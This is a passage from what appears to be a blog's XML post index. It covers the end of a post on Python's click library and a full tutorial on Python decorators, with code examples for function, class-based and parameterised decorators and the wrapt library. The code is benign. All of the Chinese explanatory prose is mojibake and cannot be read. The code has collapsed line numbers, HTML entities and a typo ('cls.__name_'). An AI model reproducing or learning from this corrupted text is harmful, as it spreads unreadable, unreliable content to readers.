ÂÖ∂‰ªñÂäüËÉΩclickËøòÊúâÊØîËæÉÂ§öÁöÑÈ´òÁ∫ßÂäüËÉΩÔºåÊØîÂ¶ÇÂàÜÈ°µÂíåÂΩ©Ëâ≤ÊâìÂç∞, clickÊñáÊ°£ÂÜôÂæóÊØîËæÉÂ•Ω: clickÂÆòÊñπÊñáÊ°£ ÊÄªÁªìpocooÈùûÂ∏∏ÁÉ≠Ë°∑‰∫é‰ΩøÁî®Ë£ÖÈ•∞Âô®, ÂèØ‰ª•ËØ¥‰ªñ‰ª¨ÂØπË£ÖÈ•∞Âô®ÁöÑ‰ΩøÁî®ÁÆÄÁõ¥Âá∫Á•ûÂÖ•Âåñ, Âú®flaskÈáåÈù¢Â∞±ÂèØËßÅ‰∏ÄÊñë, ËÄåÂâç‰∏ÄÁØáÊâçËÆ≤‰∫ÜË£ÖÈ•∞Âô®, Ëøô‰∏™clickÂ∫ìÈáåÈù¢ÂØπË£ÖÈ•∞Âô®ÁöÑ‰ΩøÁî®‰πüÁß∞Âæó‰∏äÂÖ∏ËåÉ, Ê∫êÁ†ÅÂæàÂÄºÂæó‰∏ÄËØª„ÄÇ]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>click</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PythonËøõÈò∂Á≥ªÂàó-Ë£ÖÈ•∞Âô®]]></title>
    <url>%2F2017%2F02%2F05%2Fpython-deractor%2F</url>
    <content type="text"><![CDATA[Ë£ÖÈ•∞Âô®ÊòØ‰∏Ä‰∏™ÈùûÂ∏∏ÈáçË¶ÅÁöÑÊ¶ÇÂøµÔºåÂèØËÉΩÁÆóÊòØËøõÈò∂ÁöÑ‰∏ÄÂ§ßÈó®Êßõ„ÄÇË£ÖÈ•∞Âô®ÂÖÅËÆ∏Âêë‰∏Ä‰∏™Áé∞ÊúâÁöÑÂØπË±°Ê∑ªÂä†Êñ∞ÁöÑÂäüËÉΩÔºåÂêåÊó∂Âèà‰∏çÊîπÂèòÂÖ∂ÁªìÊûÑ,ÊòØ‰∏ÄÁßçÂäüËÉΩÂ¢ûÂº∫ÁöÑÊ®°Âºè„ÄÇÂú®Èù¢ÂêëÂØπË±°(OOP)ÁöÑËÆæËÆ°Ê®°Âºè‰∏≠ÔºådecoratorË¢´Áß∞‰∏∫Ë£ÖÈ•∞Ê®°Âºè„ÄÇOOPÁöÑË£ÖÈ•∞Ê®°ÂºèÈúÄË¶ÅÈÄöËøáÁªßÊâøÂíåÁªÑÂêàÊù•ÂÆûÁé∞ÔºåËÄåPythonÈô§‰∫ÜËÉΩÊîØÊåÅOOPÁöÑdecoratorÂ§ñÔºåÁõ¥Êé•‰ªéËØ≠Ê≥ïÂ±ÇÊ¨°ÊîØÊåÅdecorator„ÄÇPythonÁöÑdecoratorÂèØ‰ª•Áî®ÂáΩÊï∞ÂÆûÁé∞Ôºå‰πüÂèØ‰ª•Áî®Á±ªÂÆûÁé∞„ÄÇÊé•‰∏ãÊù•Â∞ÜÂÖ®Èù¢‰ªãÁªçÂÖ≥‰∫éPythonË£ÖÈ•∞Âô®Áõ∏ÂÖ≥ÁöÑÁü•ËØÜ„ÄÇ ÁÆÄ‰ªãË£ÖÈ•∞Âô®Êú¨Ë¥®‰∏äÊòØ‰∏Ä‰∏™PythonÂáΩÊï∞ÔºåÂÆÉÂèØ‰ª•ËÆ©ÂÖ∂‰ªñÂáΩÊï∞Âú®‰∏çÈúÄË¶ÅÂÅö‰ªª‰Ωï‰ª£Á†ÅÂèòÂä®ÁöÑÂâçÊèê‰∏ãÂ¢ûÂä†È¢ùÂ§ñÂäüËÉΩÔºåË£ÖÈ•∞Âô®ÁöÑËøîÂõûÂÄº‰πüÊòØ‰∏Ä‰∏™ÂáΩÊï∞ÂØπË±°„ÄÇÂÆÉÁªèÂ∏∏Áî®‰∫éÊúâÂàáÈù¢ÈúÄÊ±ÇÁöÑÂú∫ÊôØÔºåÊØîÂ¶ÇÔºöÊèíÂÖ•Êó•Âøó„ÄÅÊÄßËÉΩÊµãËØï„ÄÅ‰∫ãÂä°Â§ÑÁêÜ„ÄÅÁºìÂ≠ò„ÄÅÊùÉÈôêÊ†°È™åÁ≠âÂú∫ÊôØ„ÄÇË£ÖÈ•∞Âô®ÊòØËß£ÂÜ≥ËøôÁ±ªÈóÆÈ¢òÁöÑÁªù‰Ω≥ËÆæËÆ°ÔºåÊúâ‰∫ÜË£ÖÈ•∞Âô®ÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•ÊäΩÁ¶ªÂá∫Â§ßÈáè‰∏éÂáΩÊï∞ÂäüËÉΩÊú¨Ë∫´Êó†ÂÖ≥ÁöÑÈõ∑Âêå‰ª£Á†ÅÂπ∂ÁªßÁª≠ÈáçÁî®„ÄÇÊ¶ÇÊã¨ÁöÑËÆ≤ÔºåË£ÖÈ•∞Âô®ÁöÑ‰ΩúÁî®Â∞±ÊòØ‰∏∫Â∑≤ÁªèÂ≠òÂú®ÁöÑÂáΩÊï∞ÊàñÂØπË±°Ê∑ªÂä†È¢ùÂ§ñÁöÑÂäüËÉΩ„ÄÇ ÂºïÂ≠êÂú®PythonÈáåÔºå‰∏ÄÂàáÁöÜÂØπË±°, ÂáΩÊï∞Êõ¥ÊòØÂ§¥Á≠âÂØπË±°ÔºåÂáΩÊï∞ÂØπË±°ÂèØ‰ª•Ë¢´ËµãÂÄºÁªôÂèòÈáèÔºåÊâÄ‰ª•ÔºåÈÄöËøáÂèòÈáè‰πüËÉΩË∞ÉÁî®ËØ•ÂáΩÊï∞12345678&gt;&gt;&gt; def now():... print('2017-02-02')...&gt;&gt;&gt; f = now&gt;&gt;&gt; f()2017-02-02&gt;&gt;&gt; f.__name__'now' Áé∞Âú®ÔºåÂÅáËÆæÊàë‰ª¨Ë¶ÅÂ¢ûÂº∫now()ÂáΩÊï∞ÁöÑÂäüËÉΩÔºåÊØîÂ¶ÇÔºåÂú®ÂáΩÊï∞Ë∞ÉÁî®ÂâçÂêéËá™Âä®ÊâìÂç∞Êó•ÂøóÔºå‰ΩÜÂèà‰∏çÂ∏åÊúõ‰øÆÊîπnow()ÂáΩÊï∞ÁöÑÂÆö‰πâ,ËØ•ÊÄé‰πàÂÅöÂñÉÔºüÊúÄÁÆÄÂçïÁöÑÊñπÂºèÂ∞±ÊòØÂä®ÊÄÅÊõøÊç¢nowÔºåÂπ∂‰øùÊåÅÂáΩÊï∞Á≠æÂêç‰∏çÂèò123456789101112131415def now(): print('2017-02-02')def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrappernow = debug(now)now() ‰∏∫‰∫ÜÊñπ‰æøpythonÂú®ËØ≠Ê≥ïÂ±ÇÈù¢Â∞±Â∑≤ÁªèÊîØÊåÅ‰∫ÜË£ÖÈ•∞Âô®(python &gt; 2.4),@ËØ≠Ê≥ïÁ≥ñÂÆûÈôÖ‰∏äÂ∞±Á≠â‰∫énow = debug(now), Âõ†Ê≠§ÂÆûÈôÖ‰∏äÂ∫îËØ•ËøôÊ†∑ÂÜô1234567891011121314def debug(func): def wrapper(): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func() wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')now() Ëøô‰∏™dubugË£ÖÈ•∞Âô®Êúâ‰∏™Â∑®Â§ßÁöÑÁº∫Èô∑: Êàë‰ª¨Âè™ËÉΩË£ÖÈ•∞‰∏çÂ∏¶ÂèÇÊï∞ÁöÑÂáΩÊï∞„ÄÇÂÆûÈôÖ‰∏äÂáΩÊï∞ÁöÑÂΩ¢ÂºèÂêÑÁßçÂêÑÊ†∑ÔºåÂ¶Ç‰ΩïÊâçËÉΩ‰∏Ä‰∏™Ë£ÖÈ•∞Âô®ÈÄÇÈÖçÂêÑÁßçÂáΩÊï∞ÂñÉÔºüpythonÊèê‰æõÁöÑÂèØÂèòÂèÇÊï∞ÂèØ‰ª•ÂæàÂ•ΩÁöÑËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢ò„ÄÇ12345678910111213141516171819def debug(func): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125;()".format(func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper@debugdef now(): print('2017-02-02')@debugdef hello(name): print("hello %s" % name)now()hello("Bob") Â¶ÇÊ≠§‰∏Ä‰∏™Âü∫Á°ÄÁöÑË£ÖÈ•∞Âô®Â∞±ÂÜôÂÆå‰∫ÜÔºå‰ª•‰∏ãÂ∞Ü‰ªãÁªçÂêÑÂºèÂêÑÊ†∑ÁöÑË£ÖÈ•∞Âô®„ÄÇ ÂáΩÊï∞ÂºèË£ÖÈ•∞Âô®Ë£ÖÈ•∞Âô®Êú¨Ë∫´ÊòØ‰∏Ä‰∏™ÂáΩÊï∞ Ë£ÖÈ•∞ÂáΩÊï∞Ë¢´Ë£ÖÈ•∞ÁöÑÂØπË±°ÊòØ‰∏Ä‰∏™ÂáΩÊï∞, wrapperÊòØÂØπÂáΩÊï∞ÁöÑÂ¢ûÂº∫ Âü∫Á°Ä-Ë£ÖÈ•∞Âô®Êó†ÂèÇÊï∞ËøôÊòØÊúÄÂü∫Á°ÄÁöÑ‰∏ÄÁßçË£ÖÈ•∞Âô®, Âú®ÂºïÂ≠ê‰∏≠Â∑≤ÁªèÊúâÊ†óÂ≠ê‰∫Ü„ÄÇ È´òÁ∫ß-Ë£ÖÈ•∞Âô®ÊúâÂèÇÊï∞Â∏¶ÂèÇÊï∞ÁöÑË£ÖÈ•∞Âô®ÂíåÁ±ªË£ÖÈ•∞Âô®Â±û‰∫éËøõÈò∂ÁöÑÂÜÖÂÆπ„ÄÇÂú®ÁêÜËß£Ëøô‰∫õË£ÖÈ•∞Âô®‰πãÂâçÔºåÊúÄÂ•ΩÂØπÂáΩÊï∞ÁöÑÈó≠ÂåÖÂíåË£ÖÈ•∞Âô®ÁöÑÊé•Âè£Á∫¶ÂÆöÊúâ‰∏ÄÂÆö‰∫ÜËß£„ÄÇÂÖ≥‰∫épython‰∏≠ÁöÑÈó≠ÂåÖÊ¶ÇÂøµÊàëÂú®‰∏ã‰∏ÄÁØá‰∏≠‰ºöÂçïÁã¨‰ªãÁªç,ËøôÈáå‰Ω†Âè™ÈúÄË¶ÅÁü•ÈÅìÈó≠ÂåÖÊòØ‰∏Ä‰∏™Êê∫Â∏¶Áä∂ÊÄÅÁöÑÂáΩÊï∞Âç≥ÂèØ„ÄÇÂÆûÈôÖ‰∏äÂ∞±ÊòØËøîÂõûË£ÖÈ•∞Âô®ÁöÑ‰∏Ä‰∏™ÂáΩÊï∞Ôºå‰ΩÜÊòØËøô‰∏™Ë£ÖÈ•∞Âô®Êê∫Â∏¶Â§ñÈÉ®ÂèòÈáè(ËøôÂ∞±ÊòØÈó≠ÂåÖ)12345678910111213141516171819def debug(level='INFO'): def decorator(func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125;()".format(level, func.__name__)) return func(*args, **kwargs) wrapper.__name__ = func.__name__ return wrapper return decorator@debug()def now(): print('2017-02-02')@debug("DEBUG")def hello(name): print("hello %s" % name)now()hello("Bob") Ë£ÖÈ•∞Á±ªË¢´Ë£ÖÈ•∞ÁöÑÂØπË±°ÊòØ‰∏Ä‰∏™Á±ª,wrapperÊòØÂØπÁ±ªÁöÑÂ¢ûÂº∫,ÊâÄ‰ª•Ë£ÖÈ•∞Âô®ÁöÑÂèòÂåñÂπ∂‰∏çÂ§ß,ÁîöËá≥ÂèØ‰ª•Ê≤øÁî® Âü∫Á°Ä-Ë£ÖÈ•∞Âô®Êó†ÂèÇÊï∞123456789101112131415161718def debug(cls): def wrapper(*args, **kwargs): print("[DEBUG]: enter &#123;&#125; class".format(cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name_ return wrapper@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") È´òÁ∫ß-Ë£ÖÈ•∞Âô®ÊúâÂèÇÊï∞1234567891011121314151617181920212223def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") Á±ªÂºèË£ÖÈ•∞Âô®Ë£ÖÈ•∞Âô®ÂáΩÊï∞ÂÖ∂ÂÆûÊòØËøôÊ†∑‰∏Ä‰∏™Êé•Âè£Á∫¶ÊùüÔºåÂÆÉÂøÖÈ°ªÊé•Âèó‰∏Ä‰∏™callableÂØπË±°‰Ωú‰∏∫ÂèÇÊï∞ÔºåÁÑ∂ÂêéËøîÂõû‰∏Ä‰∏™callableÂØπË±°„ÄÇÂú®Python‰∏≠‰∏ÄËà¨callableÂØπË±°ÈÉΩÊòØÂáΩÊï∞Ôºå‰ΩÜ‰πüÊúâ‰æãÂ§ñ„ÄÇÂè™Ë¶ÅÊüê‰∏™ÂØπË±°ÈáçËΩΩ‰∫Ü call () ÊñπÊ≥ïÔºåÈÇ£‰πàËøô‰∏™ÂØπË±°Â∞±ÊòØcallableÁöÑ„ÄÇÊàë‰ª¨ÂèØ‰ª•ËÆ©Á±ªÁöÑÊûÑÈÄ†ÂáΩÊï∞ init () Êé•Âèó‰∏Ä‰∏™ÂáΩÊï∞ÔºåÁÑ∂ÂêéÈáçËΩΩ call () Âπ∂ËøîÂõû‰∏Ä‰∏™ÂáΩÊï∞Ôºå‰πüÂèØ‰ª•ËææÂà∞Ë£ÖÈ•∞Âô®ÂáΩÊï∞ÁöÑÊïàÊûú„ÄÇ Ë£ÖÈ•∞ÂáΩÊï∞ÂíåÁ±ªË¢´Ë£ÖÈ•∞ÁöÑÂØπË±°ÊòØ‰∏Ä‰∏™ÂáΩÊï∞ÊàñÊòØ‰∏Ä‰∏™Á±ªÔºåÂÖ∂ÂÆûÂπ∂Ê≤°ÊúâÊú¨Ë¥®‰∏äÁöÑÂ∑ÆÂà´ÔºåÂõ†Ê≠§ËøôÈáåÂêàÂπ∂ÁªôÂá∫Ê†óÂ≠ê Ë£ÖÈ•∞Âô®Êó†ÂèÇÊï∞1234567891011121314151617181920class debug(object): def __init__(self, func): self.func = func def __call__(self, *args, **kwargs): print("[DEBUG]: enter function &#123;func&#125;()".format(func=self.func.__name__)) return self.func(*args, **kwargs)@debugclass Hello(object): def __init__(self, value): self.value = value@debugdef hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") Ë£ÖÈ•∞Âô®ÊúâÂèÇÊï∞1234567891011121314151617181920212223class debug(object): def __init__(self, level='INFO'): self._level = level def __call__(self, func): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter function &#123;&#125;()".format(self._level ,func.__name__)) return func(*args, **kwargs) return wrapper@debug()class Hello(object): def __init__(self, name): self.name = name@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob") ÂÜÖÁΩÆË£ÖÈ•∞Âô®ÂÜÖÁΩÆÁöÑË£ÖÈ•∞Âô®ÂíåÊôÆÈÄöÁöÑË£ÖÈ•∞Âô®ÂéüÁêÜÊòØ‰∏ÄÊ†∑ÁöÑÔºåÂè™‰∏çËøáËøîÂõûÁöÑ‰∏çÊòØÂáΩÊï∞ÔºåËÄåÊòØÁ±ªÂØπË±°ÔºåÊâÄ‰ª•Êõ¥ÈöæÁêÜËß£‰∏Ä‰∫õ propertÊàë‰ª¨ÂÖàÁúãÁúãpropertyÂà∞Â∫ïÊòØÂï•,‰ª•‰∏ãÊòØpropertyÁ±ªÁöÑdoc string123456789101112131415161718192021222324252627282930313233class property(object): """ property(fget=None, fset=None, fdel=None, doc=None) -&gt; property attribute fget is a function to be used for getting an attribute value, and likewise fset is a function for setting, and fdel a function for del'ing, an attribute. Typical use is to define a managed attribute x: class C(object): def getx(self): return self._x def setx(self, value): self._x = value def delx(self): del self._x x = property(getx, setx, delx, "I'm the 'x' property.") Decorators make defining new properties or modifying existing ones easy: class C(object): @property def x(self): "I am the 'x' property." return self._x @x.setter def x(self, value): self._x = value @x.deleter def x(self): del self._x """ def __init__(self, fget=None, fset=None, fdel=None, doc=None): # known special case of property.__init__ pass ... ÂÆûÈôÖ‰∏äpropertyË£ÖÈ•∞Âô®Â∏ÆÊàë‰ª¨ÂÆåÊàê‰∫Üx = property(getx, setx, delx, &quot;I&#39;m the &#39;x&#39; property.&quot;)Ëøô‰∏™Âä®‰ΩúÔºåËÄå‰∏îËøîÂõûÁöÑÊòØ‰∏Ä‰∏™propertyÂØπË±°„ÄÇ staticmethodstaticmethod‰º†ÂÖ•‰∏Ä‰∏™ÂáΩÊï∞ËøîÂõû‰∏Ä‰∏™staticmethodÁöÑÂØπË±°„ÄÇ123456789101112131415161718192021222324class staticmethod(object): """ staticmethod(function) -&gt; method Convert a function to be a static method. A static method does not receive an implicit first argument. To declare a static method, use this idiom: class C: def f(arg1, arg2, ...): ... f = staticmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. Static methods in Python are similar to those found in Java or C++. For a more advanced concept, see the classmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... classmethodÂêåÁêÜclassmethod‰º†ÂÖ•‰∏Ä‰∏™ÂáΩÊï∞ËøîÂõû‰∏Ä‰∏™classmethodÂØπË±°„ÄÇ123456789101112131415161718192021222324252627class classmethod(object): """ classmethod(function) -&gt; method Convert a function to be a class method. A class method receives the class as implicit first argument, just like an instance method receives the instance. To declare a class method, use this idiom: class C: def f(cls, arg1, arg2, ...): ... f = classmethod(f) It can be called either on the class (e.g. C.f()) or on an instance (e.g. C().f()). The instance is ignored except for its class. If a class method is called for a derived class, the derived class object is passed as the implied first argument. Class methods are different than C++ or Java static methods. If you want those, see the staticmethod builtin. """ def __init__(self, function): # real signature unknown; restored from __doc__ pass ... ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÈóÆÈ¢òË£ÖÈ•∞Âô®ÂèØ‰ª•ËÆ©‰Ω†‰ª£Á†ÅÊõ¥Âä†‰ºòÈõÖÔºåÂáèÂ∞ëÈáçÂ§çÔºå‰ΩÜ‰πü‰∏çÂÖ®ÊòØ‰ºòÁÇπÔºå‰πü‰ºöÂ∏¶Êù•‰∏Ä‰∫õÈóÆÈ¢ò„ÄÇ ‰ΩçÁΩÆÈîôËØØ1234567891011121314151617181920212223def html_tags(tag_name): print('begin outer function.') def wrapper(func): print("begin of inner wrapper function.") def wrapper(*args, **kwargs): content = func(*args, **kwargs) print("&lt;&#123;tag&#125;&gt;&#123;content&#125;&lt;/&#123;tag&#125;&gt;".format(tag=tag_name, content=content)) print('end of inner wrapper function.') return wrapper print('end of outer function') return wrapper@html_tags('b')def hello(name='Toby'): return 'Hello &#123;&#125;!'.format(name)hello()hello() Âú®Ë£ÖÈ•∞Âô®‰∏≠ÊàëÂú®ÂêÑ‰∏™ÂèØËÉΩÁöÑ‰ΩçÁΩÆÈÉΩÂä†‰∏ä‰∫Ü print ËØ≠Âè•ÔºåÁî®‰∫éËÆ∞ÂΩïË¢´Ë∞ÉÁî®ÁöÑÊÉÖÂÜµ„ÄÇ‰Ω†Áü•ÈÅì‰ªñ‰ª¨ÊúÄÂêéÊâìÂç∞Âá∫Êù•ÁöÑÈ°∫Â∫èÂêóÔºüÂ¶ÇÊûú‰Ω†ÂøÉÈáåÊ≤°Â∫ïÔºåÈÇ£‰πàÊúÄÂ•Ω‰∏çË¶ÅÂú®Ë£ÖÈ•∞Âô®ÂáΩÊï∞‰πãÂ§ñÊ∑ªÂä†ÈÄªËæëÂäüËÉΩÔºåÂê¶ÂàôËøô‰∏™Ë£ÖÈ•∞Âô®Â∞±‰∏çÂèó‰Ω†ÊéßÂà∂‰∫Ü1234567begin outer function.end of outer functionbegin of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function.&lt;b&gt;Hello Toby!&lt;/b&gt;end of inner wrapper function. ÂáΩÊï∞Á≠æÂêçÂíåÊñáÊ°£‰ΩøÁî®Ë£ÖÈ•∞Âô®ÂêéÂÆûÈôÖ‰∏äÂáΩÊï∞ÁöÑÂâçÈù¢ÂíåÊñáÊ°£ÈÉΩ‰ºöË¢´ÊõøÊç¢ÊàêwrapperÁöÑÔºåËôΩÁÑ∂Êàë‰ª¨ÂèØ‰ª•ÁÆÄÂçïÂ§ÑÁêÜËøáÊù•,‰ΩÜÊòØËøôÂπ∂‰∏çÊòØÂÆåÁæéÁöÑËß£ÂÜ≥‰πãÈÅì123456789101112131415161718192021222324252627282930import inspectdef debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decorator@debug()class Hello(object): def __init__(self, value): self.value = value@debug("ERROR")def hello(name): print("hello %s" % name)h = Hello("Bob")hello("Bob")print(Hello.__name__)print(hello.__name__)print(inspect.getsource(Hello))print(inspect.getsource(hello)) staticmethodÂíåclassmethod‰∏çËÉΩÂÜçÊ¨°Ë£ÖÈ•∞ÂΩì‰Ω†ÊÉ≥ÊääË£ÖÈ•∞Âô®Áî®Âú®‰∏Ä‰∏™ÈùôÊÄÅÊñπÊ≥ïÊàñËÄÖÁ±ªÊñπÊ≥ïÊó∂Ôºå‰∏çÂ•ΩÊÑèÊÄùÔºåÊä•Èîô‰∫Ü„ÄÇ12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug # Ë£ÖÈ•∞ÂÆû‰æãÊñπÊ≥ïÔºåOK def run(self): print("&#123;&#125; is running!".format(self.model)) @debug # Ë£ÖÈ•∞ÈùôÊÄÅÊñπÊ≥ïÔºåFailed @staticmethod def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) ÂâçÈù¢Â∑≤ÁªèËß£Èáä‰∫Ü@staticmethodËøô‰∏™Ë£ÖÈ•∞Âô®ÔºåÂÖ∂ÂÆûÂÆÉËøîÂõûÁöÑÂπ∂‰∏çÊòØ‰∏Ä‰∏™callableÂØπË±°ÔºåËÄåÊòØ‰∏Ä‰∏™staticmethodÂØπË±°ÔºåÈÇ£‰πàÂÆÉÊòØ‰∏çÁ¨¶ÂêàË£ÖÈ•∞Âô®Ë¶ÅÊ±ÇÁöÑÔºàÊØîÂ¶Ç‰º†ÂÖ•‰∏Ä‰∏™callableÂØπË±°ÔºâÔºå‰Ω†Ëá™ÁÑ∂‰∏çËÉΩÂú®ÂÆÉ‰πã‰∏äÂÜçÂä†Âà´ÁöÑË£ÖÈ•∞Âô®„ÄÇË¶ÅËß£ÂÜ≥Ëøô‰∏™ÈóÆÈ¢òÂæàÁÆÄÂçïÔºåÂè™Ë¶ÅÊää‰Ω†ÁöÑË£ÖÈ•∞Âô®ÊîæÂú®@staticmethod‰πãÂâçÂ∞±Â•Ω‰∫ÜÔºåÂõ†‰∏∫‰Ω†ÁöÑË£ÖÈ•∞Âô®ËøîÂõûÁöÑËøòÊòØ‰∏Ä‰∏™Ê≠£Â∏∏ÁöÑÂáΩÊï∞ÔºåÁÑ∂ÂêéÂÜçÂä†‰∏ä‰∏Ä‰∏™@staticmethodÊòØ‰∏ç‰ºöÂá∫ÈóÆÈ¢òÁöÑ„ÄÇ12345678910111213141516171819202122232425262728293031def debug(level='INFO'): def decorator(cls): def wrapper(*args, **kwargs): print("[&#123;&#125;]: enter &#123;&#125; class".format(level, cls.__name__)) return cls(*args, **kwargs) wrapper.__name__ = cls.__name__ return wrapper return decoratorclass Car(object): def __init__(self, model): self.model = model @debug() # Ë£ÖÈ•∞ÂÆû‰æãÊñπÊ≥ïÔºåOK def run(self): print("&#123;&#125; is running!".format(self.model)) @staticmethod @debug() # ÈùôÊÄÅË£ÖÈ•∞Âô®ÊîæÂà∞ÊúÄÂêéÂ∞±ok‰∫Ü def check_model_for(obj): if isinstance(obj, Car): print("The model of your car is &#123;&#125;".format(obj.model)) else: print("&#123;&#125; is not a car!".format(obj))car = Car('six')car.check_model_for(car) Âà©Áî®Á¨¨‰∏âÊñπÂ∫ìÊù•ÂÜôË£ÖÈ•∞Âô®ÂµåÂ•óÁöÑË£ÖÈ•∞ÂáΩÊï∞‰∏çÂ§™Áõ¥ËßÇÔºåÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî®Á¨¨‰∏âÊñπÂåÖÁ±ªÊîπËøõËøôÊ†∑ÁöÑÊÉÖÂÜµÔºåËÆ©Ë£ÖÈ•∞Âô®ÂáΩÊï∞ÂèØËØªÊÄßÊõ¥Â•Ω„ÄÇ decoratordecorator.pyÊòØ‰∏Ä‰∏™ÈùûÂ∏∏ÁÆÄÂçïÁöÑË£ÖÈ•∞Âô®Âä†Âº∫ÂåÖ„ÄÇ‰Ω†ÂèØ‰ª•ÂæàÁõ¥ËßÇÁöÑÂÖàÂÆö‰πâÂåÖË£ÖÂáΩÊï∞wrapper() ÔºåÂÜç‰ΩøÁî®decorate(func, wrapper)ÊñπÊ≥ïÂ∞±ÂèØ‰ª•ÂÆåÊàê‰∏Ä‰∏™Ë£ÖÈ•∞Âô®„ÄÇ1234567891011121314151617181920@decoratordef debug(func, *args, **kwargs): print("[DEBUG] &#123;&#125;: enter &#123;&#125;()".format(datetime.now(), func.__name__)) return func(*args, **kwargs)@debugdef hello(name): """test""" print("hello %s" % name)@debugclass Hello(object): def __init__(self, name): self.name = namehello("Bob")print(inspect.getsource(hello))print(hello.__name__) decoratorÊØîËæÉÁÆÄÈôã, Ë¶ÅË£ÖÈ•∞Á±ªÂíåÂ∏¶ÂèÇÊï∞ÁöÑË£ÖÈ•∞Â∞±‰∏çËÉΩÂæàÂ•ΩÊîØÊåÅ‰∫Ü„ÄÇ wraptwraptÊòØ‰∏Ä‰∏™ÂäüËÉΩÈùûÂ∏∏ÂÆåÂñÑÁöÑÂåÖÔºåÁî®‰∫éÂÆûÁé∞ÂêÑÁßç‰Ω†ÊÉ≥Âà∞ÊàñËÄÖ‰Ω†Ê≤°ÊÉ≥Âà∞ÁöÑË£ÖÈ•∞Âô®„ÄÇ‰ΩøÁî® wrapt ÂÆûÁé∞ÁöÑË£ÖÈ•∞Âô®‰Ω†‰∏çÈúÄË¶ÅÊãÖÂøÉ‰πãÂâç inspect ‰∏≠ÈÅáÂà∞ÁöÑÊâÄÊúâÈóÆÈ¢òÔºåÂõ†‰∏∫ÂÆÉÈÉΩÂ∏Æ‰Ω†Â§ÑÁêÜ‰∫ÜÔºåÁîöËá≥ inspect.getsource ( func ) ‰πüÂáÜÁ°ÆÊó†ËØØÊõ¥ÂÖ®Èù¢ÁöÑÊñáÊ°£ÂèØ‰ª•ÂèÇËÄÉwraptÂÆòÊñπÊñáÊ°£123456789101112131415161718192021222324252627282930313233343536373839404142434445from datetime import datetimeimport wraptdef debug(level='INFO'): @wrapt.decorator def wrapper(wrapped, instance, args, kwargs): print("[&#123;&#125;]: &#123;&#125; message".format(level, datetime.now())) return wrapped(*args, **kwargs) return wrapperclass Class(object): @debug() def function_im(self, arg1, arg2): pass @debug("DEBUG") @classmethod def function_cm(cls, arg1, arg2): pass @debug("ERROR") @staticmethod def function_sm(arg1, arg2): pass@debug()class Hello(): def __init__(self, name): self.name = name@debug()def hello(name): print("hello %s" % name)c = Class()c.function_im(1, 2)Class.function_im(c, 1, 2)Class.function_cm(1, 2)Class.function_sm(1, 2)h = Hello("Bob")hello("Bob") ÊÄªÁªìË£ÖÈ•∞Âô®ÁöÑÁêÜÂøµÊòØÂØπÂéüÂáΩÊï∞„ÄÅÂØπË±°ÁöÑÂä†Âº∫ÔºåÁõ∏ÂΩì‰∫éÈáçÊñ∞Â∞ÅË£ÖÔºåÊâÄ‰ª•‰∏ÄËà¨Ë£ÖÈ•∞Âô®ÂáΩÊï∞ÈÉΩË¢´ÂëΩÂêç‰∏∫wrapper() ÔºåÊÑè‰πâÂú®‰∫éÂåÖË£Ö„ÄÇÂáΩÊï∞Âè™ÊúâÂú®Ë¢´Ë∞ÉÁî®Êó∂Êâç‰ºöÂèëÊå•ÂÖ∂‰ΩúÁî®„ÄÇÊØîÂ¶Ç@debug Ë£ÖÈ•∞Âô®ÂèØ‰ª•Âú®ÂáΩÊï∞ÊâßË°åÊó∂È¢ùÂ§ñËæìÂá∫Êó•ÂøóÔºå @cacheË£ÖÈ•∞ËøáÁöÑÂáΩÊï∞ÂèØ‰ª•ÁºìÂ≠òËÆ°ÁÆóÁªìÊûúÁ≠âÁ≠â„ÄÇÊúÄÂêéÈÅøÂÖçÈáçÂ§çÈÄ†ËΩÆÂ≠êÊé®Ëçê‰ΩøÁî®wraptÔºåÈô§ÈùûwraptÁúü‰∏çËÉΩÊª°Ë∂≥‰Ω†ÁöÑÁâπÊÄßÈúÄÊ±Ç„ÄÇ]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>deractor</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[È´òÊÄßËÉΩweb‰πãfasthttp]]></title>
